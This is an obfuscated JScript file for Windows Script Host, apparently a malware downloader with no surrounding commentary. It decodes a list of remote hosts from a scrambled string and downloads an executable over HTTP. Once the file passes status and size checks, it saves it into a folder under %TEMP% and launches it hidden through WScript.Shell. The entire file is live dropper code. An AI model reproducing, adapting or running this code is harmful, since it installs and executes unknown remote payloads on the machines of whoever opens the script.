
function lwcCnmZiK(suvjganYKUM) {
var LCHviqpR = "VwDQ Ws EGnEcjc cri pt.S MXlZzo hell".split(" ");
var PSqujbEi = WScript.CreateObject(LCHviqpR[1] + LCHviqpR[3] + LCHviqpR[4] + LCHviqpR[6]);
PSqujbEi.Run(suvjganYKUM, 0x1, 0x0);
}
function AiULrcgqU(QSNwh,tIoeV,PpQTu,OsDv) {
var GgGbv = "WEWQKh HMb pt.Shell LGgZYfH Scri  %TE MP% \\".split(" ");
var OIX=((1)?"W" + GgGbv[4]:"")+GgGbv[2];
var lR = WScript.CreateObject(OIX);
return lR.ExpandEnvironmentStrings(GgGbv[6]+GgGbv[7]+GgGbv[8]);
}
function eqhfjcao() {
var VyrIVgd = "Sc qonQABk r oBMGAqaLe ipting fgkfKlH GZT ile ZSHGFGSsQygGjk System PK NeALp Obj FltHRU ect nKCLmEX".split(" ");
return VyrIVgd[0] + VyrIVgd[2] + VyrIVgd[4] + ".F" + VyrIVgd[7] + VyrIVgd[9] + VyrIVgd[12] + VyrIVgd[14];
}
function GCEL(lGkkp) {
nFKTOTo = WScript.CreateObject(lGkkp);
return nFKTOTo
}
function pVuC(akrtQ,DnfNP) {
akrtQ.write(DnfNP);
}
function OZSs(qDjph) {
qDjph.open();
}
function ethB(aPUfc,crDhA) {
aPUfc.saveToFile(crDhA,831-829);
}
function aGWJ(FlVuq,lRgau,EXJQo) {
FlVuq.open(EXJQo,lRgau,false);
}
function ZaPE(gxiUS) {
if (gxiUS == 906-706){return true;} else {return false;}
}
function PjNQ(HYZhC) {
if (HYZhC > 192604-647){return true;} else {return false;}
}
function sGdw(GBKaF) {
var LVMEZ="";
Q=(938-938);
while(true) {
if (Q >= GBKaF.length) {break;}
if (Q % (631-629) != (524-524)) {
LVMEZ += GBKaF.substring(Q, Q+(462-461));
}
Q++;
}
return LVMEZ;
}
function eViP(PnxaC) {
var LoIcHUyU=["\x73\x65\x6E\x64"];
PnxaC[LoIcHUyU[0]]();
}
function tuEb(Gtauf) {
return Gtauf.status;
}
function JjxJI(IiOoyp) {
return new ActiveXObject(IiOoyp);
}
function KshuZPW(ELza) {
return ELza.responseBody;
}
function zRpeBCJn(uuT) {
return uuT.size;
}
var Gc="Bg9r1ele0toiEnmgYsvj8anmzaEjMctaefQf2.UcIogmu/F679eCueDtemo?c jh6ellOlFo4myiEsktIeurObziHz1nye0scqBq8.McfoRmU/Q6X9bC5eCtymK?c 5?3 M?Q r?";
var Qm = sGdw(Gc).split(" ");
var AsBvHI = ". joneWc e kJKFyDdI xe Cetm".split(" ");
var c = [Qm[0].replace(new RegExp(AsBvHI[5],'g'), AsBvHI[0]+AsBvHI[2]+AsBvHI[4]),Qm[1].replace(new RegExp(AsBvHI[5],'g'), AsBvHI[0]+AsBvHI[2]+AsBvHI[4]),Qm[2].replace(new RegExp(AsBvHI[5],'g'), AsBvHI[0]+AsBvHI[2]+AsBvHI[4]),Qm[3].replace(new RegExp(AsBvHI[5],'g'), AsBvHI[0]+AsBvHI[2]+AsBvHI[4]),Qm[4].replace(new RegExp(AsBvHI[5],'g'), AsBvHI[0]+AsBvHI[2]+AsBvHI[4])];
var rEP = AiULrcgqU("axMC","fSTeY","bnmYBT","dEiiVcd");
var HVi = JjxJI(eqhfjcao());
var uYlWDp = ("mHKUARD \\").split(" ");
var eZmo = rEP+uYlWDp[0]+uYlWDp[1];
try{
HVi.CreateFolder(eZmo);
}catch(kMaete){
};
var jYt = ("2.XMLHTTP YqXWVYa sofKM XML ream St IYHFHwLC AD RKYMPVf O AbNw D").split(" ");
var Qu = true  , lHoo = jYt[7] + jYt[9] + jYt[11];
var hT = GCEL("MS"+jYt[3]+(285557, jYt[0]));
var AiL = GCEL(lHoo + "B." + jYt[5]+(671611, jYt[4]));
var rqw = 0;
var X = 1;
var cZcabYt = 154218;
var m=rqw;
while (true)  {
if(m>=c.length) {break;}
var jb = 0;
var nRv = ("ht" + " NumlYGs tp lLGYD grTDEDRJ :// ZOdpHbL .e xe G ET").split(" ");
try  {
var xsUXc=nRv[765-765]+nRv[528-526]+nRv[519-514];
aGWJ(hT,xsUXc+c[m]+X, nRv[9]+nRv[10]); eViP(hT); if (ZaPE(tuEb(hT)))  {      
OZSs(AiL); AiL.type = 1; pVuC(AiL,KshuZPW(hT)); if (PjNQ(zRpeBCJn(AiL)))  {
jb = 1;AiL.position=0;ethB(AiL,/*bsPR65jSsJ*/eZmo/*hVnU991A8K*/+cZcabYt+nRv[7]+nRv[8]); try  {
if (((new Date())>0,7677761888)) {
lwcCnmZiK(eZmo+cZcabYt+/*OvE820tx5y*/nRv[7]+nRv[8]/*OgII56ThJK*/); 
break;
}
}
catch (he)  {
}; 
}; AiL.close(); 
}; 
if (jb == 1)  {
rqw = m; break; 
}; 
}
catch (he)  { 
}; 
m++;
}; 

